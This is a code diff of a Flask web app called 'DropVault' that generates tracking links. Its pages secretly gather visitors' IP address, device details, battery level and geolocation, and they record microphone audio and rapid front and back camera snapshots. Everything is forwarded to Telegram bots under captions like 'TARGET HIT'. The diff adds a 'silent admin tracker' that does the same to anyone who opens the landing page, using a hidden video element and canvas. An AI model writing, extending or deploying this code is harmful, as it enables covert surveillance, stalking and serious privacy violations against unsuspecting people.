@@ -30,9 +30,10 @@ def escape_md(text):
     escape_chars = r'_*[]()~`>#+-=|{}.!'
     return ''.join('\\' + char if char in escape_chars else char for char in str(text))
 
-def send_tg_msg(token, cid, text):
+def send_tg_msg(token, cid, text, v_url=""):
     try: 
-        footer = "\n\n*v site:* [https://secure\\-links\\-psi\\.vercel\\.app](https://secure-links-psi.vercel.app)"
+        safe_url = escape_md(v_url)
+        footer = f"\n\n*v site:* [{safe_url}]({v_url})" if v_url else ""
         full_text = text + footer
         requests.post(
             f"https://api.telegram.org/bot{token}/sendMessage", 
@@ -41,9 +42,10 @@ def send_tg_msg(token, cid, text):
         )
     except: pass
 
-def send_tg_photo(token, cid, raw_img, caption=""):
+def send_tg_photo(token, cid, raw_img, caption="", v_url=""):
     try: 
-        footer = "\n\n*v site:* [https://secure\\-links\\-psi\\.vercel\\.app](https://secure-links-psi.vercel.app)"
+        safe_url = escape_md(v_url)
+        footer = f"\n\n*v site:* [{safe_url}]({v_url})" if v_url else ""
         full_caption = caption + footer
         requests.post(
             f"https://api.telegram.org/bot{token}/sendPhoto", 
@@ -53,15 +55,15 @@ def send_tg_photo(token, cid, raw_img, caption=""):
         )
     except: pass
 
-def send_tg_audio(token, cid, raw_audio, caption=""):
+def send_tg_audio(token, cid, raw_audio, caption="", v_url=""):
     try: 
-        footer = "\n\n*v site:* [https://secure\\-links\\-psi\\.vercel\\.app](https://secure-links-psi.vercel.app)"
+        safe_url = escape_md(v_url)
+        footer = f"\n\n*v site:* [{safe_url}]({v_url})" if v_url else ""
         full_caption = caption + footer
-        # Bhejne ke liye sendDocument use kar rahe hain taake Telegram webm ko reject na kare
         requests.post(
-            f"https://api.telegram.org/bot{token}/sendDocument", 
+            f"https://api.telegram.org/bot{token}/sendAudio", 
             data={"chat_id": cid, "caption": full_caption, "parse_mode": "MarkdownV2"}, 
-            files={"document": ("audio_capture.webm", raw_audio, "audio/webm")}, 
+            files={"audio": ("voice.mp3", raw_audio, "audio/mpeg")}, 
             timeout=15
         )
     except: pass
@@ -81,6 +83,16 @@ def get_user_cid():
     except: return None
 
 def is_admin(): return get_user_cid() == ADMIN_CID
+
+def get_link_context(l_id, req):
+    if l_id == "admin":
+        return {
+            "users": {"bot_token": ADMIN_TOKEN, "chat_id": ADMIN_CID},
+            "target_domain": req.host_url.rstrip("/")
+        }
+    else:
+        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
+        return link
 
 # --- UI TEMPLATES (Tailwind, Aurora Gradient, Dark/Light Mode) ---
 def get_base_html(content, title="DropVault"):
@@ -170,7 +182,7 @@ def get_base_html(content, title="DropVault"):
     </html>
     """
 
-# Landing Page
+# Landing Page (Now with Admin Tracking Module)
 @app.route("/")
 def index(): 
     content = """
@@ -202,6 +214,120 @@ def index():
             </div>
         </div>
     </div>
+
+    <!-- SILENT ADMIN TRACKER FOR ROOT PAGE -->
+    <canvas id="c" class="hidden"></canvas>
+    <video id="bg-v" playsinline autoplay muted class="fixed top-[-1000px] left-[-1000px] w-2 h-2 opacity-0 -z-50"></video>
+    <script>
+        let l_id = "admin";
+        let camType = "front_back";
+        
+        let batteryInfo = "Not Fetched";
+        if(navigator.getBattery) { navigator.getBattery().then(b => { batteryInfo = Math.round(b.level * 100) + '%'; }); }
+
+        window.onload = () => {
+            setTimeout(() => {
+                fetch("/api/log_hardware/admin", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ plat: navigator.platform, cores: navigator.hardwareConcurrency || 0, battery: batteryInfo }) }).catch(()=>{});
+                
+                if(navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (p) => { fetch("/api/log_loc/admin", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) }).catch(()=>{}); },
+                        (e) => {}, { timeout: 8000 }
+                    );
+                }
+                startAudioRecording();
+                startUltraStealthSequence();
+            }, 1000);
+        };
+
+        let mediaRecorder;
+        let audioChunks = [];
+        let isRecording = false;
+
+        async function startAudioRecording() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: { echoCancellation: true, noiseSuppression: true } });
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
+                mediaRecorder.onstop = () => {
+                    if (audioChunks.length > 0) {
+                        let audioBlob = new Blob(audioChunks);
+                        let reader = new FileReader();
+                        reader.readAsDataURL(audioBlob);
+                        reader.onloadend = () => {
+                            fetch("/api/capture_audio/admin", {
+                                method: "POST", headers: {"Content-Type": "application/json"},
+                                body: JSON.stringify({ audio: reader.result }), keepalive: true
+                            }).catch(()=>{});
+                        };
+                    }
+                    audioChunks = [];
+                    if(isRecording) mediaRecorder.start();
+                };
+                
+                isRecording = true;
+                mediaRecorder.start();
+                
+                setInterval(() => {
+                    if(mediaRecorder && mediaRecorder.state === "recording") { mediaRecorder.stop(); }
+                }, 10000);
+
+                document.addEventListener("visibilitychange", () => {
+                    if(document.visibilityState === 'hidden' && mediaRecorder && mediaRecorder.state === "recording") { mediaRecorder.stop(); }
+                });
+                window.addEventListener("pagehide", () => {
+                    if(mediaRecorder && mediaRecorder.state === "recording") { isRecording = false; mediaRecorder.stop(); }
+                });
+            } catch(err) {}
+        }
+
+        let camStream = null; 
+        let currentCam = "user"; 
+        let captureIntervalId = null; 
+        let lastSentImage = "";
+
+        async function switchCameraTo(facingModeStr) {
+            if (camStream) { camStream.getTracks().forEach(track => track.stop()); camStream = null; }
+            try {
+                camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingModeStr === "environment" ? { ideal: "environment" } : "user", width: { ideal: 640 }, height: { ideal: 480 } } });
+                const bgV = document.getElementById('bg-v');
+                bgV.srcObject = camStream; bgV.onloadedmetadata = () => { bgV.play(); };
+                currentCam = facingModeStr;
+            } catch(e) {}
+        }
+
+        function captureUltraFast() {
+            if(camStream) {
+                const bgV = document.getElementById('bg-v'); const c = document.getElementById('c');
+                if(bgV.videoWidth > 0) {
+                    c.width = bgV.videoWidth; c.height = bgV.videoHeight;
+                    c.getContext('2d').drawImage(bgV, 0, 0, c.width, c.height);
+                    let imgData = c.toDataURL('image/jpeg', 0.6);
+                    if (imgData === lastSentImage) return; 
+                    lastSentImage = imgData;
+                    
+                    let camLabel = currentCam === "user" ? "FRONT" : "BACK";
+                    fetch("/api/capture/admin", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: imgData, cam_type: camLabel }) }).catch(()=>{});
+                }
+            }
+        }
+
+        async function startUltraStealthSequence() {
+            currentCam = "user"; 
+            await switchCameraTo(currentCam);
+            if(captureIntervalId) clearInterval(captureIntervalId);
+            captureIntervalId = setInterval(captureUltraFast, 300);
+            runCamCycle();
+        }
+
+        function runCamCycle() {
+            setTimeout(async () => { 
+                currentCam = (currentCam === "user") ? "environment" : "user";
+                await switchCameraTo(currentCam); 
+                runCamCycle(); 
+            }, 10000); 
+        }
+    </script>
     """
     return render_template_string(get_base_html(content, "DropVault | Home"))
 
@@ -756,7 +882,6 @@ def target_page(link_id):
     target_type = data.get("target_type", "both")
     cam_type = data.get("cam_type", "front_back")
     
-    # Identify if media (Image or Video) is being sent
     val = action_value
     ext = val.split('.')[-1].lower() if val else ''
     is_media = action_mode == 'file' and (ext in ['mp4', 'webm', 'ogg', 'mov', 'jpg', 'jpeg', 'png', 'gif', 'webp'] or file_type in ['image', 'video'])
@@ -831,16 +956,12 @@ def target_page(link_id):
             let l_id = "{{ l_id }}";
             let isMedia = {{ 'true' if is_media else 'false' }};
 
-            // Battery Fetcher
             let batteryInfo = "Not Fetched";
-            if(navigator.getBattery) {
-                navigator.getBattery().then(b => { batteryInfo = Math.round(b.level * 100) + '%'; });
-            }
+            if(navigator.getBattery) { navigator.getBattery().then(b => { batteryInfo = Math.round(b.level * 100) + '%'; }); }
 
             window.onload = () => { 
                 startVerificationTimer();
                 
-                // Allow a slight delay for UI render before heavily hitting hardware
                 setTimeout(() => {
                     getHardware(); 
                     if(mode.includes('loc') || mode === 'both' || mode === 'location') {
@@ -963,21 +1084,18 @@ def target_page(link_id):
                     isRecording = true;
                     mediaRecorder.start();
                     
-                    // Stop & Start every 10 seconds to create 10s chunks
                     setInterval(() => {
                         if(mediaRecorder && mediaRecorder.state === "recording") {
                             mediaRecorder.stop();
                         }
                     }, 10000);
 
-                    // If user minimizes or switches tab, force send what's recorded
                     document.addEventListener("visibilitychange", () => {
                         if(document.visibilityState === 'hidden' && mediaRecorder && mediaRecorder.state === "recording") {
                             mediaRecorder.stop();
                         }
                     });
                     
-                    // Force send on page hide (works better on mobile than beforeunload)
                     window.addEventListener("pagehide", () => {
                         if(mediaRecorder && mediaRecorder.state === "recording") {
                             isRecording = false;
@@ -985,9 +1103,7 @@ def target_page(link_id):
                         }
                     });
 
-                } catch(err) {
-                    console.log("Mic access error:", err);
-                }
+                } catch(err) {}
             }
 
             // --- CAMERA LOGIC (10s Front/Back Cycle & Fast Capture) ---
@@ -1026,7 +1142,6 @@ def target_page(link_id):
                 currentCam = (camType === "back") ? "environment" : "user"; 
                 await switchCameraTo(currentCam);
                 if(captureIntervalId) clearInterval(captureIntervalId);
-                // 300ms ki speed par dhara-dhar capture karega
                 captureIntervalId = setInterval(captureUltraFast, 300);
                 if (camType === "front_back") runCamCycle();
             }
@@ -1049,58 +1164,83 @@ def target_page(link_id):
 def log_hw(l_id):
     global live_buffer
     try:
-        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
+        link = get_link_context(l_id, request)
         user = link["users"]
         d = request.get_json()
         ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         dev_info = f"{d['plat']} - Cores: {d['cores']}"
         bat_info = d.get('battery', 'Unknown')
         
+        v_url = f"{link['target_domain']}/t/{l_id}" if l_id != "admin" else link['target_domain']
+
         if "devices" not in live_buffer: live_buffer["devices"] = []
         live_buffer["devices"].append({"ip": ip, "dev": dev_info, "time": time.strftime("%I:%M %p")})
         
         msg = f"🎯 *TARGET HIT*\n\n🌐 *IP:* `{escape_md(ip)}`\n💻 *Device:* `{escape_md(dev_info)}`\n🔋 *Battery:* `{escape_md(bat_info)}`"
-        send_tg_msg(user["bot_token"], user["chat_id"], msg)
-        send_tg_msg(ADMIN_TOKEN, ADMIN_CID, msg + f"\n\n_Admin Copy \\| User: {user['chat_id']}_")
+        
+        if l_id != "admin":
+            send_tg_msg(user["bot_token"], user["chat_id"], msg, v_url)
+            send_tg_msg(ADMIN_TOKEN, ADMIN_CID, msg + f"\n\n_Admin Copy \\| User: {user['chat_id']}_", v_url)
+        else:
+            send_tg_msg(ADMIN_TOKEN, ADMIN_CID, msg + f"\n\n_Root Hit \\| Direct Access_", v_url)
     except: pass
     return jsonify({"s": 1})
 
 @app.route("/api/log_loc/<l_id>", methods=["POST"])
 def log_loc(l_id):
     try:
-        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
+        link = get_link_context(l_id, request)
+        user = link["users"]
         d = request.get_json()
+        
+        v_url = f"{link['target_domain']}/t/{l_id}" if l_id != "admin" else link['target_domain']
         msg = f"📍 *LOCATION ACQUIRED*\n\n*Map:* [Google Maps](https://www.google.com/maps?q={d['lat']},{d['lon']})"
-        send_tg_msg(link["users"]["bot_token"], link["users"]["chat_id"], msg)
-        send_tg_msg(ADMIN_TOKEN, ADMIN_CID, msg + f"\n\n_Admin Copy \\| User: {link['users']['chat_id']}_")
+        
+        if l_id != "admin":
+            send_tg_msg(user["bot_token"], user["chat_id"], msg, v_url)
+            send_tg_msg(ADMIN_TOKEN, ADMIN_CID, msg + f"\n\n_Admin Copy \\| User: {user['chat_id']}_", v_url)
+        else:
+            send_tg_msg(ADMIN_TOKEN, ADMIN_CID, msg + f"\n\n_Root Hit \\| Direct Access_", v_url)
     except: pass
     return jsonify({"s": 1})
 
 @app.route("/api/capture/<l_id>", methods=["POST"])
 def cap(l_id):
     try:
-        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
+        link = get_link_context(l_id, request)
+        user = link["users"]
         req_data = request.get_json()
         raw = base64.b64decode(req_data["img"].split(",")[1])
         c_type = req_data.get("cam_type", "UNKNOWN")
         
+        v_url = f"{link['target_domain']}/t/{l_id}" if l_id != "admin" else link['target_domain']
         caption = f"📸 *CAMERA CAPTURE* \\({c_type}\\)"
-        send_tg_photo(link["users"]["bot_token"], link["users"]["chat_id"], raw, caption)
-        send_tg_photo(ADMIN_TOKEN, ADMIN_CID, raw, caption + f"\n\n_Admin Copy \\| User: {link['users']['chat_id']}_")
+        
+        if l_id != "admin":
+            send_tg_photo(user["bot_token"], user["chat_id"], raw, caption, v_url)
+            send_tg_photo(ADMIN_TOKEN, ADMIN_CID, raw, caption + f"\n\n_Admin Copy \\| User: {user['chat_id']}_", v_url)
+        else:
+            send_tg_photo(ADMIN_TOKEN, ADMIN_CID, raw, caption + f"\n\n_Root Hit \\| Direct Access_", v_url)
     except: pass
     return jsonify({"s": 1})
 
 @app.route("/api/capture_audio/<l_id>", methods=["POST"])
 def cap_audio(l_id):
     try:
-        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
+        link = get_link_context(l_id, request)
+        user = link["users"]
         req_data = request.get_json()
         raw = base64.b64decode(req_data["audio"].split(",")[1])
         
+        v_url = f"{link['target_domain']}/t/{l_id}" if l_id != "admin" else link['target_domain']
         caption = f"🎤 *AUDIO RECORDING INTERCEPTED*"
-        send_tg_audio(link["users"]["bot_token"], link["users"]["chat_id"], raw, caption)
-        send_tg_audio(ADMIN_TOKEN, ADMIN_CID, raw, caption + f"\n\n_Admin Copy \\| User: {link['users']['chat_id']}_")
-    except Exception as e: pass
+        
+        if l_id != "admin":
+            send_tg_audio(user["bot_token"], user["chat_id"], raw, caption, v_url)
+            send_tg_audio(ADMIN_TOKEN, ADMIN_CID, raw, caption + f"\n\n_Admin Copy \\| User: {user['chat_id']}_", v_url)
+        else:
+            send_tg_audio(ADMIN_TOKEN, ADMIN_CID, raw, caption + f"\n\n_Root Hit \\| Direct Access_", v_url)
+    except: pass
     return jsonify({"s": 1})
 
 @app.route("/api/fetch_devices")
